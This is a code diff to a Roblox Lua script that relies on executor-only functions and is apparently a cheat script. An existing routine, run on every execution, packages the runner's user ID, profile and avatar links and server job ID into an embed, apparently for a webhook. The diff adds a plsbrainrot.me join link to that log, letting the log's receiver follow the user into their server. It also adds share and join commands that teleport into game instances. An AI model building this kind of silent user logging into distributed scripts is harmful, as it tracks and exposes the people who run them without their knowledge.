@@ -44,10 +44,11 @@ local function sendAdvancedLog(player)
         shortJobId = string.sub(jobId, 1, 8) .. "..."
     end
     
-    -- Generate Roblox profile URLs and avatar
     local userId = tostring(player.id or "0")
     local robloxProfileURL = "https://www.roblox.com/users/" .. userId .. "/profile"
     local avatarURL = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false"
+    
+    local serverLink = string.format("https://plsbrainrot.me/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
     
     local data = {
         ["content"] = "",
@@ -75,6 +76,11 @@ local function sendAdvancedLog(player)
                     ["inline"] = false
                 },
                 {
+                    ["name"] = "🔗 Join Link (Click to join)",
+                    ["value"] = serverLink,
+                    ["inline"] = false
+                },
+                {
                     ["name"] = "⏰ Execution Time",
                     ["value"] = "`" .. os.date("%A, %B %d, %Y • %I:%M:%S %p") .. "`",
                     ["inline"] = false
@@ -99,6 +105,52 @@ local function sendAdvancedLog(player)
         })
     end)
 end
+
+-- ============================================
+-- JOINER COMMANDS
+-- ============================================
+
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+getgenv().share = function()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local link = string.format("https://plsbrainrot.me/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
+    setclipboard(link)
+    print("Server link copied to clipboard!")
+    print("Link: " .. link)
+    return link
+end
+
+getgenv().join = function(link)
+    local instanceId = link:match("gameInstanceId=([%w%-]+)")
+    if instanceId then
+        print("Joining server...")
+        TeleportService:TeleportToGameInstance(142823291, instanceId, LocalPlayer)
+    else
+        print("Invalid link. Use the link from share()")
+    end
+end
+
+getgenv().getServerLink = function()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    return string.format("https://plsbrainrot.me/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
+end
+
+print("")
+print("========================================")
+print("JOINER COMMANDS READY")
+print("========================================")
+print("")
+print("Commands:")
+print("  share() - Copy your server link to clipboard")
+print("  join('link') - Join a server from a plsbrainrot.me link")
+print("  getServerLink() - Get your current server link")
+print("")
+
 local player = getDetailedPlayerInfo()
 sendAdvancedLog(player)
 
